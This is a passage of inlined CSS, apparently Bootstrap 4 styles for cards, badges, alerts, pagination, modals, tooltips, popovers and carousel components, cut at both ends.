      margin-left: 1.25rem
    }

    .card-header {
      padding: .75rem 1.25rem;
      margin-bottom: 0;
      background-color: rgba(0, 0, 0, .03);
      border-bottom: 1px solid rgba(0, 0, 0, .125)
    }

    .card-header:first-child {
      border-radius: calc(.25rem - 1px) calc(.25rem - 1px) 0 0
    }

    .card-header+.list-group .list-group-item:first-child {
      border-top: 0
    }

    .card-footer {
      padding: .75rem 1.25rem;
      background-color: rgba(0, 0, 0, .03);
      border-top: 1px solid rgba(0, 0, 0, .125)
    }

    .card-footer:last-child {
      border-radius: 0 0 calc(.25rem - 1px) calc(.25rem - 1px)
    }

    .card-header-tabs {
      margin-right: -.625rem;
      margin-bottom: -.75rem;
      margin-left: -.625rem;
      border-bottom: 0
    }

    .card-header-pills {
      margin-right: -.625rem;
      margin-left: -.625rem
    }

    .card-img-overlay {
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      padding: 1.25rem
    }

    .card-img {
      width: 100%;
      border-radius: calc(.25rem - 1px)
    }

    .card-img-top {
      width: 100%;
      border-top-left-radius: calc(.25rem - 1px);
      border-top-right-radius: calc(.25rem - 1px)
    }

    .card-img-bottom {
      width: 100%;
      border-bottom-right-radius: calc(.25rem - 1px);
      border-bottom-left-radius: calc(.25rem - 1px)
    }

    .card-deck {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column
    }

    .card-deck .card {
      margin-bottom: 15px
    }

    @media (min-width:576px) {
      .card-deck {
        -ms-flex-flow: row wrap;
        flex-flow: row wrap;
        margin-right: -15px;
        margin-left: -15px
      }

      .card-deck .card {
        display: -ms-flexbox;
        display: flex;
        -ms-flex: 1 0 0%;
        flex: 1 0 0%;
        -ms-flex-direction: column;
        flex-direction: column;
        margin-right: 15px;
        margin-bottom: 0;
        margin-left: 15px
      }
    }

    .card-group {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column
    }

    .card-group>.card {
      margin-bottom: 15px
    }

    @media (min-width:576px) {
      .card-group {
        -ms-flex-flow: row wrap;
        flex-flow: row wrap
      }

      .card-group>.card {
        -ms-flex: 1 0 0%;
        flex: 1 0 0%;
        margin-bottom: 0
      }

      .card-group>.card+.card {
        margin-left: 0;
        border-left: 0
      }

      .card-group>.card:first-child {
        border-top-right-radius: 0;
        border-bottom-right-radius: 0
      }

      .card-group>.card:first-child .card-header,
      .card-group>.card:first-child .card-img-top {
        border-top-right-radius: 0
      }

      .card-group>.card:first-child .card-footer,
      .card-group>.card:first-child .card-img-bottom {
        border-bottom-right-radius: 0
      }

      .card-group>.card:last-child {
        border-top-left-radius: 0;
        border-bottom-left-radius: 0
      }

      .card-group>.card:last-child .card-header,
      .card-group>.card:last-child .card-img-top {
        border-top-left-radius: 0
      }

      .card-group>.card:last-child .card-footer,
      .card-group>.card:last-child .card-img-bottom {
        border-bottom-left-radius: 0
      }

      .card-group>.card:only-child {
        border-radius: .25rem
      }

      .card-group>.card:only-child .card-header,
      .card-group>.card:only-child .card-img-top {
        border-top-left-radius: .25rem;
        border-top-right-radius: .25rem
      }

      .card-group>.card:only-child .card-footer,
      .card-group>.card:only-child .card-img-bottom {
        border-bottom-right-radius: .25rem;
        border-bottom-left-radius: .25rem
      }

      .card-group>.card:not(:first-child):not(:last-child):not(:only-child) {
        border-radius: 0
      }

      .card-group>.card:not(:first-child):not(:last-child):not(:only-child) .card-footer,
      .card-group>.card:not(:first-child):not(:last-child):not(:only-child) .card-header,
      .card-group>.card:not(:first-child):not(:last-child):not(:only-child) .card-img-bottom,
      .card-group>.card:not(:first-child):not(:last-child):not(:only-child) .card-img-top {
        border-radius: 0
      }
    }

    .card-columns .card {
      margin-bottom: .75rem
    }

    @media (min-width:576px) {
      .card-columns {
        -webkit-column-count: 3;
        -moz-column-count: 3;
        column-count: 3;
        -webkit-column-gap: 1.25rem;
        -moz-column-gap: 1.25rem;
        column-gap: 1.25rem;
        orphans: 1;
        widows: 1
      }

      .card-columns .card {
        display: inline-block;
        width: 100%
      }
    }

    .accordion .card:not(:first-of-type):not(:last-of-type) {
      border-bottom: 0;
      border-radius: 0
    }

    .accordion .card:not(:first-of-type) .card-header:first-child {
      border-radius: 0
    }

    .accordion .card:first-of-type {
      border-bottom: 0;
      border-bottom-right-radius: 0;
      border-bottom-left-radius: 0
    }

    .accordion .card:last-of-type {
      border-top-left-radius: 0;
      border-top-right-radius: 0
    }

    .breadcrumb {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-wrap: wrap;
      flex-wrap: wrap;
      padding: .75rem 1rem;
      margin-bottom: 1rem;
      list-style: none;
      background-color: #e9ecef;
      border-radius: .25rem
    }

    .breadcrumb-item+.breadcrumb-item {
      padding-left: .5rem
    }

    .breadcrumb-item+.breadcrumb-item::before {
      display: inline-block;
      padding-right: .5rem;
      color: #6c757d;
      content: "/"
    }

    .breadcrumb-item+.breadcrumb-item:hover::before {
      text-decoration: underline
    }

    .breadcrumb-item+.breadcrumb-item:hover::before {
      text-decoration: none
    }

    .breadcrumb-item.active {
      color: #6c757d
    }

    .pagination {
      display: -ms-flexbox;
      display: flex;
      padding-left: 0;
      list-style: none;
      border-radius: .25rem
    }

    .page-link {
      position: relative;
      display: block;
      padding: .5rem .75rem;
      margin-left: -1px;
      line-height: 1.25;
      color: #007bff;
      background-color: #fff;
      border: 1px solid #dee2e6
    }

    .page-link:hover {
      z-index: 2;
      color: #0056b3;
      text-decoration: none;
      background-color: #e9ecef;
      border-color: #dee2e6
    }

    .page-link:focus {
      z-index: 2;
      outline: 0;
      box-shadow: 0 0 0 .2rem rgba(0, 123, 255, .25)
    }

    .page-link:not(:disabled):not(.disabled) {
      cursor: pointer
    }

    .page-item:first-child .page-link {
      margin-left: 0;
      border-top-left-radius: .25rem;
      border-bottom-left-radius: .25rem
    }

    .page-item:last-child .page-link {
      border-top-right-radius: .25rem;
      border-bottom-right-radius: .25rem
    }

    .page-item.active .page-link {
      z-index: 1;
      color: #fff;
      background-color: #007bff;
      border-color: #007bff
    }

    .page-item.disabled .page-link {
      color: #6c757d;
      pointer-events: none;
      cursor: auto;
      background-color: #fff;
      border-color: #dee2e6
    }

    .pagination-lg .page-link {
      padding: .75rem 1.5rem;
      font-size: 1.25rem;
      line-height: 1.5
    }

    .pagination-lg .page-item:first-child .page-link {
      border-top-left-radius: .3rem;
      border-bottom-left-radius: .3rem
    }

    .pagination-lg .page-item:last-child .page-link {
      border-top-right-radius: .3rem;
      border-bottom-right-radius: .3rem
    }

    .pagination-sm .page-link {
      padding: .25rem .5rem;
      font-size: .875rem;
      line-height: 1.5
    }

    .pagination-sm .page-item:first-child .page-link {
      border-top-left-radius: .2rem;
      border-bottom-left-radius: .2rem
    }

    .pagination-sm .page-item:last-child .page-link {
      border-top-right-radius: .2rem;
      border-bottom-right-radius: .2rem
    }

    .badge {
      display: inline-block;
      padding: .25em .4em;
      font-size: 75%;
      font-weight: 700;
      line-height: 1;
      text-align: center;
      white-space: nowrap;
      vertical-align: baseline;
      border-radius: .25rem
    }

    .badge:empty {
      display: none
    }

    .btn .badge {
      position: relative;
      top: -1px
    }

    .badge-pill {
      padding-right: .6em;
      padding-left: .6em;
      border-radius: 10rem
    }

    .badge-primary {
      color: #fff;
      background-color: #007bff
    }

    .badge-primary[href]:focus,
    .badge-primary[href]:hover {
      color: #fff;
      text-decoration: none;
      background-color: #0062cc
    }

    .badge-secondary {
      color: #fff;
      background-color: #6c757d
    }

    .badge-secondary[href]:focus,
    .badge-secondary[href]:hover {
      color: #fff;
      text-decoration: none;
      background-color: #545b62
    }

    .badge-success {
      color: #fff;
      background-color: #28a745
    }

    .badge-success[href]:focus,
    .badge-success[href]:hover {
      color: #fff;
      text-decoration: none;
      background-color: #1e7e34
    }

    .badge-info {
      color: #fff;
      background-color: #17a2b8
    }

    .badge-info[href]:focus,
    .badge-info[href]:hover {
      color: #fff;
      text-decoration: none;
      background-color: #117a8b
    }

    .badge-warning {
      color: #212529;
      background-color: #ffc107
    }

    .badge-warning[href]:focus,
    .badge-warning[href]:hover {
      color: #212529;
      text-decoration: none;
      background-color: #d39e00
    }

    .badge-danger {
      color: #fff;
      background-color: #dc3545
    }

    .badge-danger[href]:focus,
    .badge-danger[href]:hover {
      color: #fff;
      text-decoration: none;
      background-color: #bd2130
    }

    .badge-light {
      color: #212529;
      background-color: #f8f9fa
    }

    .badge-light[href]:focus,
    .badge-light[href]:hover {
      color: #212529;
      text-decoration: none;
      background-color: #dae0e5
    }

    .badge-dark {
      color: #fff;
      background-color: #343a40
    }

    .badge-dark[href]:focus,
    .badge-dark[href]:hover {
      color: #fff;
      text-decoration: none;
      background-color: #1d2124
    }

    .jumbotron {
      padding: 2rem 1rem;
      margin-bottom: 2rem;
      background-color: #e9ecef;
      border-radius: .3rem
    }

    @media (min-width:576px) {
      .jumbotron {
        padding: 4rem 2rem
      }
    }

    .jumbotron-fluid {
      padding-right: 0;
      padding-left: 0;
      border-radius: 0
    }

    .alert {
      position: relative;
      padding: .75rem 1.25rem;
      margin-bottom: 1rem;
      border: 1px solid transparent;
      border-radius: .25rem
    }

    .alert-heading {
      color: inherit
    }

    .alert-link {
      font-weight: 700
    }

    .alert-dismissible {
      padding-right: 4rem
    }

    .alert-dismissible .close {
      position: absolute;
      top: 0;
      right: 0;
      padding: .75rem 1.25rem;
      color: inherit
    }

    .alert-primary {
      color: #004085;
      background-color: #cce5ff;
      border-color: #b8daff
    }

    .alert-primary hr {
      border-top-color: #9fcdff
    }

    .alert-primary .alert-link {
      color: #002752
    }

    .alert-secondary {
      color: #383d41;
      background-color: #e2e3e5;
      border-color: #d6d8db
    }

    .alert-secondary hr {
      border-top-color: #c8cbcf
    }

    .alert-secondary .alert-link {
      color: #202326
    }

    .alert-success {
      color: #155724;
      background-color: #d4edda;
      border-color: #c3e6cb
    }

    .alert-success hr {
      border-top-color: #b1dfbb
    }

    .alert-success .alert-link {
      color: #0b2e13
    }

    .alert-info {
      color: #0c5460;
      background-color: #d1ecf1;
      border-color: #bee5eb
    }

    .alert-info hr {
      border-top-color: #abdde5
    }

    .alert-info .alert-link {
      color: #062c33
    }

    .alert-warning {
      color: #856404;
      background-color: #fff3cd;
      border-color: #ffeeba
    }

    .alert-warning hr {
      border-top-color: #ffe8a1
    }

    .alert-warning .alert-link {
      color: #533f03
    }

    .alert-danger {
      color: #721c24;
      background-color: #f8d7da;
      border-color: #f5c6cb
    }

    .alert-danger hr {
      border-top-color: #f1b0b7
    }

    .alert-danger .alert-link {
      color: #491217
    }

    .alert-light {
      color: #818182;
      background-color: #fefefe;
      border-color: #fdfdfe
    }

    .alert-light hr {
      border-top-color: #ececf6
    }

    .alert-light .alert-link {
      color: #686868
    }

    .alert-dark {
      color: #1b1e21;
      background-color: #d6d8d9;
      border-color: #c6c8ca
    }

    .alert-dark hr {
      border-top-color: #b9bbbe
    }

    .alert-dark .alert-link {
      color: #040505
    }

    @-webkit-keyframes progress-bar-stripes {
      from {
        background-position: 1rem 0
      }

      to {
        background-position: 0 0
      }
    }

    @keyframes progress-bar-stripes {
      from {
        background-position: 1rem 0
      }

      to {
        background-position: 0 0
      }
    }

    .progress {
      display: -ms-flexbox;
      display: flex;
      height: 1rem;
      overflow: hidden;
      font-size: .75rem;
      background-color: #e9ecef;
      border-radius: .25rem
    }

    .progress-bar {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column;
      -ms-flex-pack: center;
      justify-content: center;
      color: #fff;
      text-align: center;
      white-space: nowrap;
      background-color: #007bff;
      transition: width .6s ease
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .progress-bar {
        transition: none
      }
    }

    .progress-bar-striped {
      background-image: linear-gradient(45deg, rgba(255, 255, 255, .15) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .15) 50%, rgba(255, 255, 255, .15) 75%, transparent 75%, transparent);
      background-size: 1rem 1rem
    }

    .progress-bar-animated {
      -webkit-animation: progress-bar-stripes 1s linear infinite;
      animation: progress-bar-stripes 1s linear infinite
    }

    .media {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: start;
      align-items: flex-start
    }

    .media-body {
      -ms-flex: 1;
      flex: 1
    }

    .list-group {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column;
      padding-left: 0;
      margin-bottom: 0
    }

    .list-group-item-action {
      width: 100%;
      color: #495057;
      text-align: inherit
    }

    .list-group-item-action:focus,
    .list-group-item-action:hover {
      color: #495057;
      text-decoration: none;
      background-color: #f8f9fa
    }

    .list-group-item-action:active {
      color: #212529;
      background-color: #e9ecef
    }

    .list-group-item {
      position: relative;
      display: block;
      padding: .75rem 1.25rem;
      margin-bottom: -1px;
      background-color: #fff;
      border: 1px solid rgba(0, 0, 0, .125)
    }

    .list-group-item:first-child {
      border-top-left-radius: .25rem;
      border-top-right-radius: .25rem
    }

    .list-group-item:last-child {
      margin-bottom: 0;
      border-bottom-right-radius: .25rem;
      border-bottom-left-radius: .25rem
    }

    .list-group-item:focus,
    .list-group-item:hover {
      z-index: 1;
      text-decoration: none
    }

    .list-group-item.disabled,
    .list-group-item:disabled {
      color: #6c757d;
      background-color: #fff
    }

    .list-group-item.active {
      z-index: 2;
      color: #fff;
      background-color: #007bff;
      border-color: #007bff
    }

    .list-group-flush .list-group-item {
      border-right: 0;
      border-left: 0;
      border-radius: 0
    }

    .list-group-flush:first-child .list-group-item:first-child {
      border-top: 0
    }

    .list-group-flush:last-child .list-group-item:last-child {
      border-bottom: 0
    }

    .list-group-item-primary {
      color: #004085;
      background-color: #b8daff
    }

    .list-group-item-primary.list-group-item-action:focus,
    .list-group-item-primary.list-group-item-action:hover {
      color: #004085;
      background-color: #9fcdff
    }

    .list-group-item-primary.list-group-item-action.active {
      color: #fff;
      background-color: #004085;
      border-color: #004085
    }

    .list-group-item-secondary {
      color: #383d41;
      background-color: #d6d8db
    }

    .list-group-item-secondary.list-group-item-action:focus,
    .list-group-item-secondary.list-group-item-action:hover {
      color: #383d41;
      background-color: #c8cbcf
    }

    .list-group-item-secondary.list-group-item-action.active {
      color: #fff;
      background-color: #383d41;
      border-color: #383d41
    }

    .list-group-item-success {
      color: #155724;
      background-color: #c3e6cb
    }

    .list-group-item-success.list-group-item-action:focus,
    .list-group-item-success.list-group-item-action:hover {
      color: #155724;
      background-color: #b1dfbb
    }

    .list-group-item-success.list-group-item-action.active {
      color: #fff;
      background-color: #155724;
      border-color: #155724
    }

    .list-group-item-info {
      color: #0c5460;
      background-color: #bee5eb
    }

    .list-group-item-info.list-group-item-action:focus,
    .list-group-item-info.list-group-item-action:hover {
      color: #0c5460;
      background-color: #abdde5
    }

    .list-group-item-info.list-group-item-action.active {
      color: #fff;
      background-color: #0c5460;
      border-color: #0c5460
    }

    .list-group-item-warning {
      color: #856404;
      background-color: #ffeeba
    }

    .list-group-item-warning.list-group-item-action:focus,
    .list-group-item-warning.list-group-item-action:hover {
      color: #856404;
      background-color: #ffe8a1
    }

    .list-group-item-warning.list-group-item-action.active {
      color: #fff;
      background-color: #856404;
      border-color: #856404
    }

    .list-group-item-danger {
      color: #721c24;
      background-color: #f5c6cb
    }

    .list-group-item-danger.list-group-item-action:focus,
    .list-group-item-danger.list-group-item-action:hover {
      color: #721c24;
      background-color: #f1b0b7
    }

    .list-group-item-danger.list-group-item-action.active {
      color: #fff;
      background-color: #721c24;
      border-color: #721c24
    }

    .list-group-item-light {
      color: #818182;
      background-color: #fdfdfe
    }

    .list-group-item-light.list-group-item-action:focus,
    .list-group-item-light.list-group-item-action:hover {
      color: #818182;
      background-color: #ececf6
    }

    .list-group-item-light.list-group-item-action.active {
      color: #fff;
      background-color: #818182;
      border-color: #818182
    }

    .list-group-item-dark {
      color: #1b1e21;
      background-color: #c6c8ca
    }

    .list-group-item-dark.list-group-item-action:focus,
    .list-group-item-dark.list-group-item-action:hover {
      color: #1b1e21;
      background-color: #b9bbbe
    }

    .list-group-item-dark.list-group-item-action.active {
      color: #fff;
      background-color: #1b1e21;
      border-color: #1b1e21
    }

    .close {
      float: right;
      font-size: 1.5rem;
      font-weight: 700;
      line-height: 1;
      color: #000;
      text-shadow: 0 1px 0 #fff;
      opacity: .5
    }

    .close:not(:disabled):not(.disabled) {
      cursor: pointer
    }

    .close:not(:disabled):not(.disabled):focus,
    .close:not(:disabled):not(.disabled):hover {
      color: #000;
      text-decoration: none;
      opacity: .75
    }

    button.close {
      padding: 0;
      background-color: transparent;
      border: 0;
      -webkit-appearance: none
    }

    .modal-open {
      overflow: hidden
    }

    .modal-open .modal {
      overflow-x: hidden;
      overflow-y: auto
    }

    .modal {
      position: fixed;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      z-index: 1050;
      display: none;
      overflow: hidden;
      outline: 0
    }

    .modal-dialog {
      position: relative;
      width: auto;
      margin: .5rem;
      pointer-events: none
    }

    .modal.fade .modal-dialog {
      transition: -webkit-transform .3s ease-out;
      transition: transform .3s ease-out;
      transition: transform .3s ease-out, -webkit-transform .3s ease-out;
      -webkit-transform: translate(0, -25%);
      transform: translate(0, -25%)
    }

    @media screen and (prefers-reduced-motion:reduce) {
      .modal.fade .modal-dialog {
        transition: none
      }
    }

    .modal.show .modal-dialog {
      -webkit-transform: translate(0, 0);
      transform: translate(0, 0)
    }

    .modal-dialog-centered {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
      align-items: center;
      min-height: calc(100% - (.5rem * 2))
    }

    .modal-dialog-centered::before {
      display: block;
      height: calc(100vh - (.5rem * 2));
      content: ""
    }

    .modal-content {
      position: relative;
      display: -ms-flexbox;
      display: flex;
      -ms-flex-direction: column;
      flex-direction: column;
      width: 100%;
      pointer-events: auto;
      background-color: #fff;
      background-clip: padding-box;
      border: 1px solid rgba(0, 0, 0, .2);
      border-radius: .3rem;
      outline: 0
    }

    .modal-backdrop {
      position: fixed;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      z-index: 1040;
      background-color: #000
    }

    .modal-backdrop.fade {
      opacity: 0
    }

    .modal-backdrop.show {
      opacity: .5
    }

    .modal-header {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: start;
      align-items: flex-start;
      -ms-flex-pack: justify;
      justify-content: space-between;
      padding: 1rem;
      border-bottom: 1px solid #e9ecef;
      border-top-left-radius: .3rem;
      border-top-right-radius: .3rem
    }

    .modal-header .close {
      padding: 1rem;
      margin: -1rem -1rem -1rem auto
    }

    .modal-title {
      margin-bottom: 0;
      line-height: 1.5
    }

    .modal-body {
      position: relative;
      -ms-flex: 1 1 auto;
      flex: 1 1 auto;
      padding: 1rem
    }

    .modal-footer {
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
      align-items: center;
      -ms-flex-pack: end;
      justify-content: flex-end;
      padding: 1rem;
      border-top: 1px solid #e9ecef
    }

    .modal-footer>:not(:first-child) {
      margin-left: .25rem
    }

    .modal-footer>:not(:last-child) {
      margin-right: .25rem
    }

    .modal-scrollbar-measure {
      position: absolute;
      top: -9999px;
      width: 50px;
      height: 50px;
      overflow: scroll
    }

    @media (min-width:576px) {
      .modal-dialog {
        max-width: 500px;
        margin: 1.75rem auto
      }

      .modal-dialog-centered {
        min-height: calc(100% - (1.75rem * 2))
      }

      .modal-dialog-centered::before {
        height: calc(100vh - (1.75rem * 2))
      }

      .modal-sm {
        max-width: 300px
      }
    }

    @media (min-width:992px) {
      .modal-lg {
        max-width: 800px
      }
    }

    .tooltip {
      position: absolute;
      z-index: 1070;
      display: block;
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      font-style: normal;
      font-weight: 400;
      line-height: 1.5;
      text-align: left;
      text-align: start;
      text-decoration: none;
      text-shadow: none;
      text-transform: none;
      letter-spacing: normal;
      word-break: normal;
      word-spacing: normal;
      white-space: normal;
      line-break: auto;
      font-size: .875rem;
      word-wrap: break-word;
      opacity: 0
    }

    .tooltip.show {
      opacity: .9
    }

    .tooltip .arrow {
      position: absolute;
      display: block;
      width: .8rem;
      height: .4rem
    }

    .tooltip .arrow::before {
      position: absolute;
      content: "";
      border-color: transparent;
      border-style: solid
    }

    .bs-tooltip-auto[x-placement^=top],
    .bs-tooltip-top {
      padding: .4rem 0
    }

    .bs-tooltip-auto[x-placement^=top] .arrow,
    .bs-tooltip-top .arrow {
      bottom: 0
    }

    .bs-tooltip-auto[x-placement^=top] .arrow::before,
    .bs-tooltip-top .arrow::before {
      top: 0;
      border-width: .4rem .4rem 0;
      border-top-color: #000
    }

    .bs-tooltip-auto[x-placement^=right],
    .bs-tooltip-right {
      padding: 0 .4rem
    }

    .bs-tooltip-auto[x-placement^=right] .arrow,
    .bs-tooltip-right .arrow {
      left: 0;
      width: .4rem;
      height: .8rem
    }

    .bs-tooltip-auto[x-placement^=right] .arrow::before,
    .bs-tooltip-right .arrow::before {
      right: 0;
      border-width: .4rem .4rem .4rem 0;
      border-right-color: #000
    }

    .bs-tooltip-auto[x-placement^=bottom],
    .bs-tooltip-bottom {
      padding: .4rem 0
    }

    .bs-tooltip-auto[x-placement^=bottom] .arrow,
    .bs-tooltip-bottom .arrow {
      top: 0
    }

    .bs-tooltip-auto[x-placement^=bottom] .arrow::before,
    .bs-tooltip-bottom .arrow::before {
      bottom: 0;
      border-width: 0 .4rem .4rem;
      border-bottom-color: #000
    }

    .bs-tooltip-auto[x-placement^=left],
    .bs-tooltip-left {
      padding: 0 .4rem
    }

    .bs-tooltip-auto[x-placement^=left] .arrow,
    .bs-tooltip-left .arrow {
      right: 0;
      width: .4rem;
      height: .8rem
    }

    .bs-tooltip-auto[x-placement^=left] .arrow::before,
    .bs-tooltip-left .arrow::before {
      left: 0;
      border-width: .4rem 0 .4rem .4rem;
      border-left-color: #000
    }

    .tooltip-inner {
      max-width: 200px;
      padding: .25rem .5rem;
      color: #fff;
      text-align: center;
      background-color: #000;
      border-radius: .25rem
    }

    .popover {
      position: absolute;
      top: 0;
      left: 0;
      z-index: 1060;
      display: block;
      max-width: 276px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
      font-style: normal;
      font-weight: 400;
      line-height: 1.5;
      text-align: left;
      text-align: start;
      text-decoration: none;
      text-shadow: none;
      text-transform: none;
      letter-spacing: normal;
      word-break: normal;
      word-spacing: normal;
      white-space: normal;
      line-break: auto;
      font-size: .875rem;
      word-wrap: break-word;
      background-color: #fff;
      background-clip: padding-box;
      border: 1px solid rgba(0, 0, 0, .2);
      border-radius: .3rem
    }

    .popover .arrow {
      position: absolute;
      display: block;
      width: 1rem;
      height: .5rem;
      margin: 0 .3rem
    }

    .popover .arrow::after,
    .popover .arrow::before {
      position: absolute;
      display: block;
      content: "";
      border-color: transparent;
      border-style: solid
    }

    .bs-popover-auto[x-placement^=top],
    .bs-popover-top {
      margin-bottom: .5rem
    }

    .bs-popover-auto[x-placement^=top] .arrow,
    .bs-popover-top .arrow {
      bottom: calc((.5rem + 1px) * -1)
    }

    .bs-popover-auto[x-placement^=top] .arrow::after,
    .bs-popover-auto[x-placement^=top] .arrow::before,
    .bs-popover-top .arrow::after,
    .bs-popover-top .arrow::before {
      border-width: .5rem .5rem 0
    }

    .bs-popover-auto[x-placement^=top] .arrow::before,
    .bs-popover-top .arrow::before {
      bottom: 0;
      border-top-color: rgba(0, 0, 0, .25)
    }

    .bs-popover-auto[x-placement^=top] .arrow::after,
    .bs-popover-top .arrow::after {
      bottom: 1px;
      border-top-color: #fff
    }

    .bs-popover-auto[x-placement^=right],
    .bs-popover-right {
      margin-left: .5rem
    }

    .bs-popover-auto[x-placement^=right] .arrow,
    .bs-popover-right .arrow {
      left: calc((.5rem + 1px) * -1);
      width: .5rem;
      height: 1rem;
      margin: .3rem 0
    }

    .bs-popover-auto[x-placement^=right] .arrow::after,
    .bs-popover-auto[x-placement^=right] .arrow::before,
    .bs-popover-right .arrow::after,
    .bs-popover-right .arrow::before {
      border-width: .5rem .5rem .5rem 0
    }

    .bs-popover-auto[x-placement^=right] .arrow::before,
    .bs-popover-right .arrow::before {
      left: 0;
      border-right-color: rgba(0, 0, 0, .25)
    }

    .bs-popover-auto[x-placement^=right] .arrow::after,
    .bs-popover-right .arrow::after {
      left: 1px;
      border-right-color: #fff
    }

    .bs-popover-auto[x-placement^=bottom],
    .bs-popover-bottom {
      margin-top: .5rem
    }

    .bs-popover-auto[x-placement^=bottom] .arrow,
    .bs-popover-bottom .arrow {
      top: calc((.5rem + 1px) * -1)
    }

    .bs-popover-auto[x-placement^=bottom] .arrow::after,
    .bs-popover-auto[x-placement^=bottom] .arrow::before,
    .bs-popover-bottom .arrow::after,
    .bs-popover-bottom .arrow::before {
      border-width: 0 .5rem .5rem .5rem
    }

    .bs-popover-auto[x-placement^=bottom] .arrow::before,
    .bs-popover-bottom .arrow::before {
      top: 0;
      border-bottom-color: rgba(0, 0, 0, .25)
    }

    .bs-popover-auto[x-placement^=bottom] .arrow::after,
    .bs-popover-bottom .arrow::after {
      top: 1px;
      border-bottom-color: #fff
    }

    .bs-popover-auto[x-placement^=bottom] .popover-header::before,
    .bs-popover-bottom .popover-header::before {
      position: absolute;
      top: 0;
      left: 50%;
      display: block;
      width: 1rem;
      margin-left: -.5rem;
      content: "";
      border-bottom: 1px solid #f7f7f7
    }

    .bs-popover-auto[x-placement^=left],
    .bs-popover-left {
      margin-right: .5rem
    }

    .bs-popover-auto[x-placement^=left] .arrow,
    .bs-popover-left .arrow {
      right: calc((.5rem + 1px) * -1);
      width: .5rem;
      height: 1rem;
      margin: .3rem 0
    }

    .bs-popover-auto[x-placement^=left] .arrow::after,
    .bs-popover-auto[x-placement^=left] .arrow::before,
    .bs-popover-left .arrow::after,
    .bs-popover-left .arrow::before {
      border-width: .5rem 0 .5rem .5rem
    }

    .bs-popover-auto[x-placement^=left] .arrow::before,
    .bs-popover-left .arrow::before {
      right: 0;
      border-left-color: rgba(0, 0, 0, .25)
    }

    .bs-popover-auto[x-placement^=left] .arrow::after,
    .bs-popover-left .arrow::after {
      right: 1px;
      border-left-color: #fff
    }

    .popover-header {
      padding: .5rem .75rem;
      margin-bottom: 0;
      font-size: 1rem;
      color: inherit;
      background-color: #f7f7f7;
      border-bottom: 1px solid #ebebeb;
      border-top-left-radius: calc(.3rem - 1px);
      border-top-right-radius: calc(.3rem - 1px)
    }

    .popover-header:empty {
      display: none
    }

    .popover-body {
      padding: .5rem .75rem;
      color: #212529
    }

    .carousel {
      position: relative
    }

    .carousel-inner {
      position: relative;
      width: 100%;
      overflow: hidden
    }

    .carousel-item {
      position: relative;
      display: none;
      -ms-flex-align: center;
      align-items: center;
      width: 100%;
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden;
      -webkit-perspective: 1000px;
      perspective: 1000px
    }

    .carousel-item-next,
    .carousel-item-prev,
    .carousel-item.active {
      display: block;
      transition: -webkit-transform .6s ease;
      transition: transform .6s ease;
      transition: transform .6s ease, -webkit-transform .6s ease
    }

    @media screen and (prefers-reduced-motion:reduce) {

      .carousel-item-next,
      .carousel-item-prev,
      .carousel-item.active {
        transition: none
      }
    }

    .carousel-item-next,
    .carousel-item-prev {
      position: absolute;
      top: 0
    }

    .carousel-item-next.carousel-item-left,
    .carousel-item-prev.carousel-item-right {
      -webkit-transform: translateX(0);
      transform: translateX(0)
    }

    @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

      .carousel-item-next.carousel-item-left,
      .carousel-item-prev.carousel-item-right {
        -webkit-transform: translate3d(0, 0, 0);
        transform: translate3d(0, 0, 0)
      }
    }

    .active.carousel-item-right,
    .carousel-item-next {
      -webkit-transform: translateX(100%);
      transform: translateX(100%)
    }

    @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

      .active.carousel-item-right,
      .carousel-item-next {
        -webkit-transform: translate3d(100%, 0, 0);
        transform: translate3d(100%, 0, 0)
      }
    }

    .active.carousel-item-left,
    .carousel-item-prev {
      -webkit-transform: translateX(-100%);
      transform: translateX(-100%)
    }

    @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

      .active.carousel-item-left,
      .carousel-item-prev {
        -webkit-transform: translate3d(-100%, 0, 0);
        transform: translate3d(-100%, 0, 0)
      }
    }

    .carousel-fade .carousel-item {
      opacity: 0;
      transition-duration: .6s;
      transition-property: opacity
    }

    .carousel-fade .carousel-item-next.carousel-item-left,
    .carousel-fade .carousel-item-prev.carousel-item-right,
    .carousel-fade .carousel-item.active {
      opacity: 1
    }

    .carousel-fade .active.carousel-item-left,
    .carousel-fade .active.carousel-item-right {
      opacity: 0
    }

    .carousel-fade .active.carousel-item-left,
    .carousel-fade .active.carousel-item-prev,
    .carousel-fade .carousel-item-next,
    .carousel-fade .carousel-item-prev,
    .carousel-fade .carousel-item.active {
      -webkit-transform: translateX(0);
      transform: translateX(0)
    }

    @supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)) {

      .carousel-fade .active.carousel-item-left,
      .carousel-fade .active.carousel-item-prev,
      .carousel-fade .carousel-item-next,
      .carousel-fade .carousel-item-prev,
      .carousel-fade .carousel-item.active {
        -webkit-transform: translate3d(0, 0, 0);
        transform: translate3d(0, 0, 0)
      }
    }

    .carousel-control-next,
    .carousel-control-prev {
      position: absolute;
      top: 0;
      bottom: 0;
      display: -ms-flexbox;
      display: flex;
      -ms-flex-align: center;
      align-items: center;
      -ms-flex-pack: center;
      justify-content: center;
      width: 15%;
